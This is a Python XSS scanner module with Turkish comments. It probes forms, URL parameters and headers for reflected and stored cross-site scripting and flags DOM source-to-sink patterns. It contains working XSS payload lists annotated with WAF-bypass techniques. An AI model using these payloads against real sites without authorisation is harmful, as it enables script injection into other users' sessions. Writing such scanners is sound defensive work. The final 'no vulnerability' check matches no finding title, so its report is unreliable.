import re
import secrets
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from .base import Scanner, ScanResult, Finding, Severity, Confidence, FindingStatus
from ..services.evidence_redaction import redact_sensitive_text
from ..services.safe_http import SafeSession, safe_session


_OWASP_INJECTION = "A03:2021 - Injection"
_CWE_XSS = "CWE-79"


_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

# ---------------------------------------------------------------------------
# Bağlam bazlı payload seti
# Önce en yüksek başarı ihtimalli payload gelir; ilk çalışanda durulur.
# Her satırın yanındaki yorum hangi WAF bypass tekniğini kullandığını açıklar.
# ---------------------------------------------------------------------------
_CONTEXT_PAYLOADS: dict[str, list[str]] = {
    # ------------------------------------------------------------------
    # HTML gövde — tag enjeksiyonu
    # ------------------------------------------------------------------
    "html_body": [
        # Klasik — birçok WAF'ı geçer
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        # HTML5 etiketleri — script/img kara listelerini atlar
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        # WAF bypass: büyük/küçük harf karışımı
        "<ScRiPt>alert(1)</ScRiPt>",
        "<IMG SRC=x OnErRoR=alert(1)>",
        # WAF bypass: boşluksuz (bazı WAF'lar "src=" + boşluk arar)
        "<img/src=x onerror=alert(1)>",
        # WAF bypass: tab ile ayırma
        "<img\tsrc=x\tonerror=alert(1)>",
        # WAF bypass: newline ile ayırma
        "<img\nsrc=x\nonerror=alert(1)>",
        # iframe srcdoc — Content-Security-Policy bypass
        '<iframe srcdoc="<script>alert(1)</script>">',
        # SVG içi script — <script> filtresini atlar
        "<svg><script>alert(1)</script></svg>",
        # object data URI
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        # HTML entity ile fonksiyon adı — bazı WAF'lar entity çözmez
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        # javascript: protokolü (href veya action olan bağlamlarda)
        '<a href="javascript:alert(1)">X</a>',
    ],

    # ------------------------------------------------------------------
    # Çift tırnaklı attribute değeri  (" ... ")
    # ------------------------------------------------------------------
    "attr_double": [
        # Event handler enjeksiyonu — yaygın
        '" onmouseover="alert(1)',
        '" onfocus="alert(1)" autofocus="',
        '" onerror="alert(1)',
        # WAF bypass: daha az bilinen event'ler
        '" onpointerover="alert(1)',
        '" onanimationend="alert(1)',
        '" ontransitionend="alert(1)',
        '" onpaste="alert(1)',
        # Tag çıkışı + script
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        # Yorum + tag çıkışı
        '"--><script>alert(1)</script>',
        # WAF bypass: büyük harf event
        '" OnMouseOver="alert(1)',
        # WAF bypass: boşluk yerine / (HTML spec izin verir)
        '"/onerror="alert(1)',
    ],

    # ------------------------------------------------------------------
    # Tek tırnaklı attribute değeri  (' ... ')
    # ------------------------------------------------------------------
    "attr_single": [
        "' onmouseover='alert(1)",
        "' onfocus='alert(1)' autofocus='",
        "' onerror='alert(1)",
        "' onpointerover='alert(1)",
        "' onanimationend='alert(1)",
        "'><script>alert(1)</script>",
        "'><img src=x onerror=alert(1)>",
        "'><svg onload=alert(1)>",
        "'><!--><script>alert(1)</script>",
        "' OnMouseOver='alert(1)",
    ],

    # ------------------------------------------------------------------
    # Tırnaksız attribute değeri  (attr=VALUE boşluk/> ile biter)
    # ------------------------------------------------------------------
    "attr_unquoted": [
        " onmouseover=alert(1) ",
        " onfocus=alert(1) autofocus ",
        " onpointerover=alert(1) ",
        "/><script>alert(1)</script>",
        "/><img src=x onerror=alert(1)>",
        # WAF bypass: boşluk yerine newline ile kapama
        "\nonmouseover=alert(1)\n",
    ],

    # ------------------------------------------------------------------
    # <script> bloğu içi
    # ------------------------------------------------------------------
    "script": [
        # String çıkışı
        "';alert(1)//",
        '";alert(1)//',
        # Template literal çıkışı
        "`;alert(1)//",
        # Script tag kapatma
        "</script><script>alert(1)</script>",
        # Newline sonrası — bazı WAF'lar satır bazlı analiz yapar
        "\nalert(1)//",
        # Blok yorum bypass
        "*/alert(1)/*",
        # WAF bypass: unicode escape (bazı WAF'lar literal kontrol eder)
        "';\\u0061lert(1)//",
        # WAF bypass: dolaylı çağrı (alert kelimesini gizler)
        "';(window['ale'+'rt'])(1)//",
        # WAF bypass: top-level await bypass (sadece module script)
        "';[].constructor.constructor('alert(1)')()//"
    ],

    # ------------------------------------------------------------------
    # HTML yorumu içi  (<!-- ... -->)
    # ------------------------------------------------------------------
    "comment": [
        "--><script>alert(1)</script>",
        "--><img src=x onerror=alert(1)>",
        "--><svg onload=alert(1)>",
        # Çift kapama — bazı parser'lar --> ile çıkmaz
        "--><!-- --><script>alert(1)</script>",
        # IE koşullu yorum bypass (eski IE hedeflemesi)
        "--><![if]><script>alert(1)</script><![endif]-->",
    ],
}

# ---------------------------------------------------------------------------
# Bağlam tespit edilemezse veya URL param/header testlerinde kullan.
# En geniş kapsama için farklı tekniklerden birer örnek içerir.
# ---------------------------------------------------------------------------
_GENERIC_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    '"><svg onload=alert(1)>',
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img/src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    "</script><script>alert(1)</script>",
    "<video><source onerror=alert(1)>",
    '<iframe srcdoc="<script>alert(1)</script>">',
]

# Yansıma testi için HTTP başlıkları
_REFLECTIVE_HEADERS = ("User-Agent", "Referer", "X-Forwarded-For")

# DOM XSS kaynak ve havuz listeleri
_DOM_SOURCES = (
    "location.hash",
    "location.search",
    "location.href",
    "document.URL",
    "document.referrer",
    "document.cookie",
    "window.name",
)

_DOM_SINKS = (
    "document.write(",
    "document.writeln(",
    "innerHTML",
    "outerHTML",
    "insertAdjacentHTML(",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "$.parseHTML(",
    ".html(",
)

_SKIP_INPUT_TYPES = frozenset({
    "submit", "button", "image", "reset", "file",
    "checkbox", "radio", "hidden",
})

_CSRF_NAMES = frozenset({
    "csrf", "csrftoken", "_token", "authenticity_token",
    "__requestverificationtoken",
})

_MAX_CRAWL_LINKS  = 5   # Ana sayfadan takip edilecek max link sayısı
_MAX_STORED_CHECK = 6   # Stored marker için kontrol edilecek max sayfa


def _is_csrf(name: str) -> bool:
    return any(c in name.lower() for c in _CSRF_NAMES)


def _collect_same_domain_links(response: requests.Response,
                                base_domain: str, base_url: str) -> list[str]:
    """
    Yanıttaki aynı domain'e ait linkleri toplar.
    Fragment (#) ve query string kırpılır; tekrar edenler atılır.
    """
    soup = BeautifulSoup(response.content, "html.parser")
    seen:  set[str]  = set()
    links: list[str] = []
    for tag in soup.find_all("a", href=True):
        href = tag["href"].split("#")[0]
        if not href:
            continue
        full   = urljoin(base_url, href)
        parsed = urlparse(full)
        if (parsed.scheme in ("http", "https")
                and parsed.hostname
                and parsed.hostname.lower() == base_domain.lower()
                and full not in seen):
            seen.add(full)
            links.append(full)
    return links


def _is_timer_sink_dangerous(sink: str, inline_js: str) -> bool:
    """setTimeout/setInterval yalnızca bir fonksiyon referansıyla çağrılıyorsa (örn.
    setTimeout(doStuff, 100)) bu, kullanıcı denetimli bir string ile çağrılmasından
    (setTimeout(userInput, 100)) farklıdır ve tek başına tehlikeli sayılmaz."""
    name = sink.rstrip("(")
    all_calls  = re.findall(rf"{name}\s*\(", inline_js)
    safe_calls = re.findall(
        rf"{name}\s*\(\s*(?:function\b|async\s+function\b|\([^)]*\)\s*=>|\w+\s*=>)", inline_js,
    )
    return len(safe_calls) < len(all_calls)


def _generate_probe() -> str:
    """Benzersiz, HTML-güvenli izleme dizisi üretir."""
    return "xssprobe" + secrets.token_hex(4)


def _detect_context(probe: str, body: str) -> str:
    """
    Probe'un yansıdığı HTML bağlamını belirler.

    Dönüş değerleri:
        'html_body'      — serbest metin alanı
        'attr_double'    — çift tırnaklı attribute değeri
        'attr_single'    — tek tırnaklı attribute değeri
        'attr_unquoted'  — tırnaksız attribute değeri
        'script'         — <script> bloğu içi
        'comment'        — HTML yorumu içi
        'not_reflected'  — yanıtta hiç görünmüyor
    """
    idx = body.find(probe)
    if idx == -1:
        return "not_reflected"

    pre = body[:idx]

    # <script> bloğu içinde mi?
    script_opens  = len(re.findall(r"<script[^>]*>", pre, re.I))
    script_closes = len(re.findall(r"</script>", pre, re.I))
    if script_opens > script_closes:
        return "script"

    # HTML yorumu içinde mi?
    if pre.rfind("<!--") > pre.rfind("-->"):
        return "comment"

    # Açık bir tag içinde mi? (son < sonra > gelmediyse)
    last_lt = pre.rfind("<")
    last_gt = pre.rfind(">")
    if last_lt > last_gt:
        since_tag = pre[last_lt:]
        dq_count  = since_tag.count('"')
        sq_count  = since_tag.count("'")
        if dq_count % 2 == 1:
            return "attr_double"
        if sq_count % 2 == 1:
            return "attr_single"
        return "attr_unquoted"

    return "html_body"


def _extract_snippet(body: str, marker: str, width: int = 80) -> str:
    """Marker etrafındaki ~80 karakterlik bağlam kesitini döner."""
    # Kanıt penceresi kesilmeden ÖNCE tüm gövde redakte edilir (yalnızca kanıt metni;
    # tespit ham gövde üzerinde yapılır)
    body = redact_sensitive_text(body)
    idx = body.find(marker)
    if idx == -1:
        return ""
    start = max(0, idx - width // 2)
    end   = min(len(body), idx + len(marker) + width // 2)
    return body[start:end].replace("\n", " ").strip()


class XssScanner(Scanner):
    def __init__(self, session: requests.Session | None = None, timeout: float = 10.0):
        self._external_session = session
        self.timeout = timeout

    def _make_session(self) -> SafeSession:
        if self._external_session:
            return safe_session(self._external_session)
        s = safe_session()
        s.headers["User-Agent"] = _USER_AGENT
        return s

    def _injectable_fields(self, form) -> list[tuple[str, str]]:
        fields = []
        for inp in form.find_all("input"):
            name = inp.get("name")
            t    = inp.get("type", "text").lower()
            if not name or t in _SKIP_INPUT_TYPES or _is_csrf(name):
                continue
            fields.append((name, inp.get("value") or ""))
        for ta in form.find_all("textarea"):
            name = ta.get("name")
            if not name or _is_csrf(name):
                continue
            fields.append((name, ta.get_text() or ""))
        for sel in form.find_all("select"):
            name = sel.get("name")
            if not name or _is_csrf(name):
                continue
            first_opt = sel.find("option")
            fields.append((name, first_opt.get("value", "") if first_opt else ""))
        return fields

    def _build_data(self, form, target_name: str, payload: str) -> dict:
        data = {}
        for el in form.find_all(["input", "textarea", "select"]):
            name = el.get("name")
            if not name:
                continue
            data[name] = payload if name == target_name else (el.get("value") or "")
        return data

    def _submit(self, session: requests.Session, url: str,
                method: str, data: dict) -> requests.Response | None:
        try:
            if method == "post":
                return session.post(url, data=data, timeout=self.timeout)
            return session.get(url, params=data, timeout=self.timeout)
        except requests.RequestException:
            return None

    # --- Form alanı testi (context-aware) ---

    def _test_field(self, url: str, method: str, form,
                    field_name: str, session: requests.Session,
                    result: ScanResult) -> None:
        # Aşama 1: benzersiz probe ile yansıma ve bağlam tespiti
        probe    = _generate_probe()
        probe_res = self._submit(session, url, method,
                                 self._build_data(form, field_name, probe))
        if not probe_res:
            return

        context = _detect_context(probe, probe_res.text)
        if context == "not_reflected":
            return  # alan hiç yansıtmıyor → payload göndermeye gerek yok

        # Aşama 2: bağlama özel payload'ları dene
        payloads = _CONTEXT_PAYLOADS.get(context, _GENERIC_PAYLOADS)
        for payload in payloads:
            res = self._submit(session, url, method,
                               self._build_data(form, field_name, payload))
            if res and payload in res.text:
                snippet = _extract_snippet(res.text, payload)
                result.findings.append(Finding(
                    severity=Severity.HIGH,
                    title="Potential Reflected XSS",
                    evidence=(
                        f"URL: {url} | Alan: {field_name} | "
                        f"Bağlam: {context} | Payload: {payload} | "
                        f"Yanıt: …{snippet}…"
                    ),
                    confidence=Confidence.HIGH,
                    status=FindingStatus.POTENTIAL,
                    description="The payload was reflected unescaped in a context that would place it in "
                                "an executable position (tag/attribute/script breakout). Browser execution "
                                "was not independently verified, so this is reported as potential rather "
                                "than confirmed.",
                    affected_url=url,
                    parameter=field_name,
                    owasp=_OWASP_INJECTION,
                    cwe=_CWE_XSS,
                    recommendation="Encode output based on context (HTML entity, attribute, or JS string "
                                   "encoding) and apply a Content-Security-Policy as defense in depth.",
                ))
                return

    # --- URL parametresi testi (context-aware) ---

    def _test_url_params(self, url: str, session: requests.Session,
                         result: ScanResult) -> None:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return
        flat = {k: v[0] for k, v in params.items()}

        for param_name in flat:
            if _is_csrf(param_name):
                continue

            # Probe ile bağlam tespiti
            probe       = _generate_probe()
            probe_params = {k: (probe if k == param_name else v) for k, v in flat.items()}
            probe_url   = urlunparse(parsed._replace(query=urlencode(probe_params)))
            try:
                probe_res = session.get(probe_url, timeout=self.timeout)
            except requests.RequestException:
                continue

            context = _detect_context(probe, probe_res.text)
            if context == "not_reflected":
                continue

            payloads = _CONTEXT_PAYLOADS.get(context, _GENERIC_PAYLOADS)
            for payload in payloads:
                inj     = {k: (payload if k == param_name else v) for k, v in flat.items()}
                test_url = urlunparse(parsed._replace(query=urlencode(inj)))
                try:
                    res = session.get(test_url, timeout=self.timeout)
                    if payload in res.text:
                        snippet = _extract_snippet(res.text, payload)
                        result.findings.append(Finding(
                            severity=Severity.HIGH,
                            title="Potential Reflected XSS",
                            evidence=(
                                f"Parametre: {param_name} | Bağlam: {context} | "
                                f"Payload: {payload} | Yanıt: …{snippet}…"
                            ),
                            confidence=Confidence.HIGH,
                            status=FindingStatus.POTENTIAL,
                            description="The payload was reflected unescaped in a context that would place "
                                        "it in an executable position. Browser execution was not "
                                        "independently verified, so this is reported as potential.",
                            affected_url=test_url,
                            parameter=param_name,
                            owasp=_OWASP_INJECTION,
                            cwe=_CWE_XSS,
                            recommendation="Encode output based on context and apply a Content-Security-"
                                           "Policy as defense in depth.",
                        ))
                        break
                except requests.RequestException:
                    continue

    # --- HTTP başlık yansıması testi (context-aware) ---

    def _test_headers(self, url: str, session: requests.Session,
                      result: ScanResult) -> None:
        for header_name in _REFLECTIVE_HEADERS:
            probe = _generate_probe()
            try:
                probe_res = session.get(url, timeout=self.timeout,
                                        headers={header_name: probe})
            except requests.RequestException:
                continue
            if probe not in probe_res.text:
                continue

            context  = _detect_context(probe, probe_res.text)
            payloads = _CONTEXT_PAYLOADS.get(context, _GENERIC_PAYLOADS)
            for payload in payloads[:5]:
                try:
                    res = session.get(url, timeout=self.timeout,
                                      headers={header_name: payload})
                    if payload in res.text:
                        snippet = _extract_snippet(res.text, payload)
                        result.findings.append(Finding(
                            severity=Severity.HIGH,
                            title="Potential Reflected XSS",
                            evidence=(
                                f"Başlık: {header_name} | Bağlam: {context} | "
                                f"Payload: {payload} | Yanıt: …{snippet}…"
                            ),
                            confidence=Confidence.HIGH,
                            status=FindingStatus.POTENTIAL,
                            description="An HTTP request header value was reflected unescaped in a context "
                                        "that would place it in an executable position. Browser execution "
                                        "was not independently verified, so this is reported as potential.",
                            affected_url=url,
                            parameter=header_name,
                            owasp=_OWASP_INJECTION,
                            cwe=_CWE_XSS,
                            recommendation="Encode output based on context and avoid reflecting raw request "
                                           "header values into HTML responses.",
                        ))
                        break
                except requests.RequestException:
                    continue

    # --- Stored XSS testi ---

    def _test_stored_field(self, form_url: str, method: str, form,
                            field_name: str, session: requests.Session,
                            result: ScanResult, crawl_pages: list[str]) -> None:
        """
        Stored XSS testi — üç aşama:
          1. Benzersiz marker enjekte et
          2. Bilinen sayfaları tara — marker herhangi birinde görünüyor mu?
          3. Marker bulunursa bağlama özel payload dene ve doğrula
        """
        marker     = "xssstored" + secrets.token_hex(4)
        submit_res = self._submit(session, form_url, method,
                                  self._build_data(form, field_name, marker))
        if not submit_res:
            return

        # Kontrol listesi: form yanıt URL'i + önceden toplanan crawl sayfaları
        candidates: list[str] = []
        for page in [submit_res.url, *crawl_pages]:
            if page not in candidates:
                candidates.append(page)

        stored_page: str | None = None
        stored_body: str        = ""
        for page_url in candidates[:_MAX_STORED_CHECK]:
            try:
                check_res = session.get(page_url, timeout=self.timeout)
                if marker in check_res.text:
                    stored_page = page_url
                    stored_body = check_res.text
                    break
            except requests.RequestException:
                continue

        if not stored_page:
            return  # marker hiçbir yerde bulunamadı

        # Marker kaydedilmiş → bağlamı tespit et ve gerçek payload dene
        context  = _detect_context(marker, stored_body)
        payloads = _CONTEXT_PAYLOADS.get(context, _GENERIC_PAYLOADS)

        for payload in payloads:
            pay_res = self._submit(session, form_url, method,
                                   self._build_data(form, field_name, payload))
            if not pay_res:
                continue
            try:
                verify_res = session.get(stored_page, timeout=self.timeout)
                if payload in verify_res.text:
                    snippet = _extract_snippet(verify_res.text, payload)
                    result.findings.append(Finding(
                        severity=Severity.HIGH,
                        title="Potential Stored XSS",
                        evidence=(
                            f"Form: {form_url} | Alan: {field_name} | "
                            f"Görüntüleme: {stored_page} | "
                            f"Bağlam: {context} | Payload: {payload} | "
                            f"Yanıt: …{snippet}…"
                        ),
                        confidence=Confidence.HIGH,
                        status=FindingStatus.POTENTIAL,
                        description="A payload stored via this field was later observed unescaped, in an "
                                    "executable context, on another page. Browser execution was not "
                                    "independently verified, so this is reported as potential rather than "
                                    "confirmed.",
                        affected_url=stored_page,
                        parameter=field_name,
                        owasp=_OWASP_INJECTION,
                        cwe=_CWE_XSS,
                        recommendation="Encode stored user input on output and apply a Content-Security-"
                                       "Policy as defense in depth.",
                    ))
                    return
            except requests.RequestException:
                continue

        # Payload doğrulanamadı ama marker kaydedilmişti → kalıcılık kanıtı, execution kanıtı değil
        result.findings.append(Finding(
            severity=Severity.MEDIUM,
            title="Stored Input Reflection Detected",
            evidence=(
                f"Form: {form_url} | Alan: {field_name} | "
                f"Marker şurada görüntülendi: {stored_page} | "
                f"Bağlam: {context} — Payload doğrulanamadı "
                f"(uygulama encode/filtre uyguluyor olabilir)"
            ),
            confidence=Confidence.MEDIUM,
            status=FindingStatus.POTENTIAL,
            description="A unique marker submitted through this field was later observed on another page, "
                        "confirming persistence. The follow-up executable payload was not found reflected "
                        "back, which may mean the application encodes or filters output — so this is not "
                        "classified as confirmed executable XSS.",
            affected_url=stored_page,
            parameter=field_name,
            owasp=_OWASP_INJECTION,
            cwe=_CWE_XSS,
        ))

    # --- DOM XSS kaynak → havuz analizi ---

    def _check_dom_xss(self, response: requests.Response, target: str,
                       result: ScanResult) -> None:
        soup = BeautifulSoup(response.content, "html.parser")
        inline_js = " ".join(
            s.string for s in soup.find_all("script") if s.string
        )
        if not inline_js:
            return

        found_sources = [src for src in _DOM_SOURCES if src in inline_js]
        found_sinks   = [snk for snk in _DOM_SINKS   if snk in inline_js]
        # setTimeout/setInterval yalnızca fonksiyon referansıyla kullanılıyorsa
        # (kullanıcı denetimli string değil) tehlikeli havuz sayılmaz (CLAUDE.md 3.4).
        dangerous_sinks = [
            snk for snk in found_sinks
            if snk not in ("setTimeout(", "setInterval(") or _is_timer_sink_dangerous(snk, inline_js)
        ]

        if found_sources and dangerous_sinks:
            result.findings.append(Finding(
                severity=Severity.HIGH,
                title="Potential DOM-based XSS - Source to Sink Flow Detected",
                evidence=(
                    f"Kaynaklar: {', '.join(found_sources)} | "
                    f"Havuzlar: {', '.join(dangerous_sinks)}"
                ),
                confidence=Confidence.MEDIUM,
                status=FindingStatus.POTENTIAL,
                description="Both an attacker-controlled source and a dangerous sink appear in the same "
                            "inline script. This is static proximity analysis, not a demonstrated data-flow "
                            "trace — the source's value reaching the sink is not verified by executing the "
                            "page, so this is not treated as confirmed.",
                affected_url=target,
                owasp=_OWASP_INJECTION,
                cwe=_CWE_XSS,
            ))
        elif dangerous_sinks:
            result.findings.append(Finding(
                severity=Severity.MEDIUM,
                title="Potential DOM-based XSS - Dangerous Sink Only",
                evidence=f"Havuzlar: {', '.join(dangerous_sinks)}",
                confidence=Confidence.LOW,
                status=FindingStatus.MANUAL_REVIEW,
                description="A potentially dangerous JavaScript sink was detected with no corresponding "
                            "attacker-controlled source identified nearby. A sink alone is not a "
                            "vulnerability — manual review is needed to determine whether any "
                            "attacker-influenced data reaches it.",
                affected_url=target,
                owasp=_OWASP_INJECTION,
                cwe=_CWE_XSS,
            ))

    # --- Ana tarama ---

    def scan(self, target: str) -> ScanResult:
        result  = ScanResult(scanner="xss", target=target)
        session = self._make_session()

        try:
            response = session.get(target, timeout=self.timeout)
        except requests.RequestException as e:
            result.error = str(e)
            return result

        soup  = BeautifulSoup(response.content, "html.parser")
        forms = soup.find_all("form")
        result.findings.append(Finding(
            severity=Severity.INFO,
            title="forms_detected",
            evidence=str(len(forms)),
        ))

        # Stored XSS için crawl listesi: hedef + aynı domain linkleri (max 5)
        parsed      = urlparse(target)
        base_domain = (parsed.hostname or "").lower()
        crawl_pages = [target] + _collect_same_domain_links(
            response, base_domain, target
        )[:_MAX_CRAWL_LINKS]

        self._check_dom_xss(response, target, result)
        self._test_headers(target, session, result)
        self._test_url_params(target, session, result)

        for form in forms:
            action_url = urljoin(target, form.get("action") or target)
            method     = form.get("method", "get").lower()
            for field_name, _ in self._injectable_fields(form):
                self._test_field(action_url, method, form, field_name, session, result)
                self._test_stored_field(action_url, method, form, field_name,
                                        session, result, crawl_pages)

        if not any(f.title.startswith("XSS") or f.title.startswith("DOM")
                   for f in result.findings):
            result.findings.append(Finding(
                severity=Severity.INFO,
                title="XSS zafiyeti bulunamadı",
            ))

        return result
